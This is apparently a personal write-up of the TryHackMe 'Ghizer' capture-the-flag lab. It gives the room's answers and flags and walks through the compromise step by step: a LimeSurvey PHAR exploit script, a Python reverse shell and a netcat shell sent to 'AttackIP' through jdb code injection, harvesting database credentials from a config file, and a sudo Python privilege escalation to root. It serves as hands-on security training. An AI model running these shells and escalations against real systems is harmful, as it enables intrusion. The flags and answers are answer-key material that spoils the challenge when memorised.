<p align="center">April 22, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{351}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/a49b4992-58ab-4c43-a80d-913bba4b4c49" alt="Your Image Badge"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Ghizer}}$$</h1>
<p align="center"><em>lucrecia has installed multiple web applications on the server.</em>.<br>
It is classified as a medium-level CTF.<br>It is .....<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/ghizerctf">here</a>.</p>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/6464e191-2db2-423a-a124-bf35a4be3e65"> </p>

<br>
<br>

<h2>Flag</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>What are the credentials you found in the configuration file? example: user:password</em><br><a id='1.1'></a>
>> <strong><code>Anny:P4$W0RD!!#S3CUr3!</code></strong><br>
<p></p>

<br>

```bash
ffff
```

<br>

> 1.2. <em>What is the login path for the wordpress installation?</em><br><a id='1.2'></a>
>> <strong><code>/?devtools</code></strong><br>
<p></p>

<br>

```bash
:~/Ghidra# nc -lvnp 1337
```

<br>


```bash
:~/Ghidra# ls
46634.py
:~/Ghidra# python2 46634.py http://TargetIP admin password
[*] Logging in to LimeSurvey...
[*] Creating a new Survey...
[+] SurveyID: 595385
[*] Uploading a malicious PHAR...
[*] Sending the Payload...
[*] TCPDF Response: <strong>TCPDF ERROR: </strong>[Image] Unable to get the size of the image: phar://./upload/surveys/595385/files/malicious.jpg
[+] Pwned! :)
[+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("AttackIP",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

<br>

```bash
:~/Ghidra# nc -lvnp 1337
www-data@ubuntu:/var/www/html/limesurvey$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null                         
www-data@ubuntu:/var/www/html/limesurvey$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
www-data@ubuntu:/home/veronica$ netstat -ntpl
...
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
...
tcp        0      0 127.0.0.1:18001         0.0.0.0:*               LISTEN      -               
...
```

> 1.3. <em>Compromise the machine and locate user.txt</em><br><a id='1.3'></a>
>> <strong><code>THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}</code></strong><br>
<p></p>

<br>

```bash
www-data@ubuntu:/home/veronica$ jdb -attach localhost:18001
jdb -attach localhost:18001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> classpath
classpath
base directory: /home/veronica
classpath: [/home/veronica/ghidra_9.0/support/../Ghidra/Framework/Utility/lib/Utility.jar]
> classes
classes
** classes list **
...
util.HistoryList
util.demangler.GenericDemangledDataType
util.demangler.GenericDemangledType
utilities.util.FileUtilities
utilities.util.FileUtilities$$Lambda$88.1642030774
utilities.util.FileUtilities$$Lambda$89.411506101
utilities.util.reflection.ReflectionUtilities
utilities.util.reflection.ReflectionUtilities$$Lambda$259.162663528
utility.applicaiton.ApplicationLayout
utility.applicaiton.ApplicationSettings
utility.applicaiton.ApplicationUtilities
utility.module.ModuleManifestFile
utility.module.ModuleUtilities
utility.module.ModuleUtilities$$Lambda$87.2128029086
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
> 
Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0

Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc AttackIP 6666 -e /bin/sh")
print new java.lang.Runtime().exec("nc AttackIP 6666 -e /bin/sh")
 new java.lang.Runtime().exec("nc AttackIP 6666 -e /bin/sh") = "Process[pid=11770, exitValue="not exited"]"
Log4j2-TF-4-Scheduled-1[1] 
```

<br>

```bash
~/Ghidra# nc -lnvp 6666
...
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
veronica@ubuntu:~$ ls
ls
base.py  Documents  examples.desktop  Music     Public       Templates  Videos
Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
veronica@ubuntu:~$ cat user.txt
cat user.txt
THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
```

<br>

> 1.4. <em>Escalate privileges and obtain root.txt</em><br><a id='1.4'></a>
>> <strong><code>THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}</code></strong><br>
<p></p>

<br>

```bash
veronica@ubuntu:~$ cat /var/www/html/limesurvey/application/config/config.php
cat /var/www/html/limesurvey/application/config/config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
	'components' => array(
		'db' => array(
			'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
			'emulatePrepare' => true,
			'username' => 'Anny',
			'password' => 'P4$W0RD!!#S3CUr3!',
			'charset' => 'utf8mb4',
			'tablePrefix' => 'lime_',
		),
		
		// Uncomment the following lines if you need table-based sessions.
		// Note: Table-based sessions are currently not supported on MSSQL server.
		// 'session' => array (
			// 'class' => 'application.core.web.DbHttpSession',
			// 'connectionID' => 'db',
			// 'sessionTableName' => '{{sessions}}',
		// ),
		
		'urlManager' => array(
			'urlFormat' => 'path',
			'rules' => array(
				// You can add your own rules here
			),
			'showScriptName' => true,
		),
	
	),
	// For security issue : it's better to set runtimePath out of web access
	// Directory must be readable and writable by the webuser
	// 'runtimePath'=>'/var/limesurvey/runtime/'
	// Use the following config variable to set modified optional settings copied from config-defaults.php
	'config'=>array(
	// debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
	// then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
	// on your webspace.
	// LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
		'debug'=>0,
		'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2
		// Update default LimeSurvey config here
	)
);
/* End of file config.php */
/* Location: ./application/config/config.php */veronica@ubuntu:~$ cat base.py
cat base.py
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)

veronica@ubuntu:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /root/Lucrecia && bash lucre.sh
#
veronica@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for veronica on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
veronica@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > base.py
echo 'import pty;pty.spawn("/bin/bash")' > base.py
bash: base.py: Permission denied
veronica@ubuntu:~$ rm base.py
rm base.py
rm: remove write-protected regular file 'base.py'? yes
yes
veronica@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > base.py
echo 'import pty;pty.spawn("/bin/bash")' > base.py
veronica@ubuntu:~$ cat base.py
cat base.py
import pty;pty.spawn("/bin/bash")
veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py
sudo /usr/bin/python3.5 /home/veronica/base.py
root@ubuntu:~# ls
ls
base.py  Documents  examples.desktop  Music     Public       Templates  Videos
Desktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt
root@ubuntu:~# pwd
pwd
/home/veronica
root@ubuntu:/# cd /root
cd root
root@ubuntu:/root# ls
ls
Lucrecia  root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
root@ubuntu:/root# 
```



<br>
<br>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="900px" src="https://github.com/user-attachments/assets/94bced15-037c-4fbe-a885-f626368f3fef"><br>
<img width="900px" src="https://github.com/user-attachments/assets/8326b483-bb5c-4759-8d7f-da3b9814b38a"></p>

<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| April 22, 2025    | 351      |     268ᵗʰ    |      6ᵗʰ     |     50ᵗʰ    |     2ⁿᵈ    |  96,169  |    675    |     59    |

</div>

<br>

<p align="center"> Global All Time: 268ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/a21c7353-56c8-4a66-9320-dab6a907aa2b"> </p>

<p align="center"> Brazil All Time:   6ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/e4222ff9-d737-43ef-80b1-e25dcf369e31"> </p>

<p align="center"> Global monthly:    50ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/78271b69-e229-4d35-ab13-828b894bce04"> </p>

<p align="center"> Brazil monthly:    2ⁿᵈ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/9d72054e-0865-4d75-8ef4-ef54d2cec615"> </p>

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/stuxnet">stuxnet</a> for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 
